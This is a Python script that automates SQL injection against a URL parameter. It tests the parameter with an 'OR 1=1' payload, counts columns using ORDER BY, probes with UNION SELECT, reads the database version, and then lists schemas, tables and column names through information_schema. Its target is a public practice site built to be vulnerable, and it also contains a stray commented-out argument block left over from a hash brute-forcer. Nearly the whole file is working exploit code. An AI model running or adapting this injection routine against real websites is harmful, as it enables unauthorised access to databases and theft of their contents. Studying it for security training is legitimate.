import argparse, time
import sys
import urllib
import urllib.request
import difflib
from difflib import SequenceMatcher

# GLOBALS

MAXCOL = 100 # The maximum number of columns allowed in a table.
MAXTABLE = 100 # The maximum number of tables to search for.
TESTUNIONSTR = "this121isa31pretty124910unique1string10192" # "Unique" string to test with.

# This dictionary contains various possible vulnerabilities to test with SQL injection.
# The structure is:
#    name: [normal, modified, injectable]
# If sanitization is done properly, the normal should match the modified more or less.
# If not, then we may have a vulnerability, and we can append our desired query to injectable.

testVuln = {
    "numeric": ["-" + str(sys.maxsize), "-" + str(sys.maxsize) + " OR 1=1", "-" + str(sys.maxsize) + " "]
}

guessTNames = [

]

# Return similarity metric between two iterables

def similarity(x, y):
    return SequenceMatcher(None, x, y).ratio()

# Attempt to count the number of columns in the table

def column_count(testurl, injectable):
    currCount = 0
    prevResponse = ""
    while currCount < MAXCOL:
        if "Unknown column '" + str(currCount) + "' in 'order clause'" in prevResponse:
            break
        currCount += 1
        prevResponse = urllib.request.urlopen(testurl + injectable + "order by " + str(currCount)).read().decode('utf-8')
    if currCount == MAXCOL:
        return "MAXCOL limit reached; cannot determine column count"
    return currCount - 1

# Check if UNION function is available

def check_union(testurl, injectable, colCount):
    for y in range(1, colCount+1):
        injectList = [str(x) for x in range(1,colCount+1)]
        injectList[y-1] = TESTUNIONSTR
        injectParam = ','.join(injectList)
        response_inj = urllib.request.urlopen(testurl + injectable + "union all select " + injectParam).read().decode('utf-8')
        if TESTUNIONSTR in response_inj:
            return injectParam # Found vulnerable number
    return False

# Obtain SQL version

def sql_version(testurl, injectable, vulnstr):
    vulnstr = vulnstr.replace(TESTUNIONSTR, 'concat("V4444ID=",version(),"END4444VID")')
    response_inj = urllib.request.urlopen(testurl + injectable + "union all select " + vulnstr).read().decode('utf-8')
    sqlV = response_inj[response_inj.find("V4444ID=")+8:response_inj.find("END4444VID")]
    if len(sqlV) > 40: # Probably not the right response...
        return False
    return sqlV

# SQL Version >= 5.0, can obtain list of table names

def table_names(testurl, injectable, vulnstr):
    currTable = -1
    tableNameList = []
    schemas = []
    while currTable < MAXTABLE:
        currTable += 1
        vulnstr = vulnstr.replace(TESTUNIONSTR, 'concat("V4444ID=",table_schema,"B4BK",table_name,"END4444VID")')
        response_inj = urllib.request.urlopen(testurl + injectable + "union all select " + vulnstr + " from information_schema.tables limit " + str(currTable) + ",1").read().decode('utf-8')
        if response_inj.find("V4444ID=") == -1:
            break
        tabSchemaName = response_inj[response_inj.find("V4444ID=")+8:response_inj.find("END4444VID")]
        tabSchema = tabSchemaName[0:tabSchemaName.find("B4BK")]
        tabName = tabSchemaName[tabSchemaName.find("B4BK")+4:]
        tableNameList.append((tabSchema, tabName))
        schemas.append(tabSchema)
    return currTable, set(schemas), tableNameList

# SQL Version < 5.0, must guess table names

def guess_table_names(testurl, injectable, vulnstr):
    tcount = 0
    tableNameList = []
    for tname in guessTNames:
        vulnstr = vulnstr.replace(TESTUNIONSTR, 'concat("V4444ID=",table_name,"END4444VID")')
        response_inj = urllib.request.urlopen(testurl + injectable + "union all select " + vulnstr + " from " + tname).read().decode('utf-8')
        if response_inj.find("V4444ID=") != -1:
            tabName = response_inj[response_inj.find("V4444ID=")+8:response_inj.find("END4444VID")]
            tableNameList.append(tabName)
            tcount += 1
    return tcount, tableNameList

# SQL Version >= 5.0, can obtain list of column names

def column_names(testurl, injectable, vulnstr, tablename):
    currCol = -1
    columnNameList = []
    while currCol < MAXCOL:
        currCol += 1
        vulnstr = vulnstr.replace(TESTUNIONSTR, 'concat("V4444ID=",column_name,"END4444VID")')
        response_inj = urllib.request.urlopen(testurl + injectable + "union all select " + vulnstr + " from information_schema.columns where table_name='" + tablename + "' limit " + str(currCol) + ",1").read().decode('utf-8')
        if response_inj.find("V4444ID=") == -1:
            break
        colName = response_inj[response_inj.find("V4444ID=")+8:response_inj.find("END4444VID")]
        columnNameList.append(colName)
    return len(columnNameList), columnNameList

# Main program container

def main(testurl):

    for vname, vuln in testVuln.items():

        # Setup our variables

        normal = vuln[0]
        modified = vuln[1]
        injectable = vuln[2]

        # Attempt to see if sanitization is implemented

        response_n = urllib.request.urlopen(testurl + normal).read().decode('utf-8')
        response_m = urllib.request.urlopen(testurl + modified).read().decode('utf-8')
        response_similarity = similarity(response_n, response_m)

        if response_similarity <= 0.9 or "You have an error in your SQL syntax" in response_m:

            print("-------------------")
            colCount = column_count(testurl, injectable)
            if not isinstance(colCount, int):
                print(colCount)
                print("Cannot proceed; breaking...")
                return
            else:
                print("Current Table Column Count: " + str(colCount))
            print("-------------------\n")

            print("-------------------")
            unionEnabled = check_union(testurl, injectable, colCount)
            if not isinstance(unionEnabled, str):
                print("UNION function not usable")
                print("Cannot proceed; breaking...")
                return
            else:
                print("UNION function usable")
            print("-------------------\n")

            print("-------------------")
            sqlVersion = sql_version(testurl, injectable, unionEnabled)
            if not isinstance(sqlVersion, str):
                print("SQL Version not found")
            else:
                print("SQL Version: " + sqlVersion)
            print("-------------------\n")

            if sqlVersion[0:2] == "5.":

                # SQL Version >= 5.0 allows for obtaining table names instead of guessing

                print("-------------------")
                print("SQL Version >= 5.0, obtaining tables...")
                numberTables, schemas, tableNames = table_names(testurl, injectable, unionEnabled)
                print("Number of Tables Found: " + str(numberTables))
                print("Table Names:")
                for s in schemas:
                    print("\nSCHEMA: " + s + " | TABLES:\n")
                    print("\n".join([b for a,b in tableNames if a==s]))
                print("-------------------\n")

                print("-------------------")
                print("SQL Version >= 5.0, obtaining columns for user-created tables...")
                for schema, tab in tableNames:
                    if schema != "information_schema":
                        numberColumns, colNameList = column_names(testurl, injectable, unionEnabled, tab)
                        print("\nTABLE: " + tab)
                        print("Number of Columns: " + str(numberColumns))
                        print("Column Names:")
                        print("\n".join(colNameList))
                print("-------------------\n")

            else:

                # SQL Version < 5.0... must check table names manually

                print("-------------------")
                print("SQL Version < 5.0, guessing tables...")
                numberTables, tableNames = guess_table_names(testurl, injectable, unionEnabled)
                print("Number of Tables Found: " + str(numberTables))
                print("Table Names:\n")
                print("\n".join(tableNames))
                print("-------------------\n")

            return

if __name__ == '__main__':
    # par = argparse.ArgumentParser(description = "Hash brute forcing.")
    # par.add_argument('inputhash', metavar='hash', type=str, help="The input hash.")
    # par.add_argument("hashmethod", metavar="method", type=str, help='The hash method. Use `--list` for a list of all available algorithms.')
    # par.add_argument("--list", action="store_true", help="List available algorithms. Overrides other arguments.")
    # par.add_argument("--dict", type=str, help="If assigned, reads the file and performs a dictionary attack with a brute force attack.", default=None)
    # par.add_argument("--corecount", type=int, help="The number of threads to use (recommended to set to number of cores). Default is 1.", default=1)
    # par.add_argument("--maxlen", type=int, default=3, help="Maximum length of string combination to brute force, if no string length is specified. Default is 3.")
    # par.add_argument("--length", type=int, default=0, help="Designated length of string to brute force. Overrides the 'maxlen' option to set a specific length.")
    # par.add_argument("--encoding", type=str, default="ascii", help="String encoding, 'utf-8' or 'ascii'; default is ASCII.")
    # arg = par.parse_args()
    # if arg.list:
    #     print(", ".join(hashlib.algorithms_guaranteed))
    # else:
    #     main(arg.inputhash, arg.hashmethod, arg.corecount, arg.maxlen, arg.length, arg.encoding, arg.dict)
    init_time = time.time()
    main("http://testphp.vulnweb.com/listproducts.php?cat=")
    print("\nTime to finish execution: " + str(time.time() - init_time) + "s")
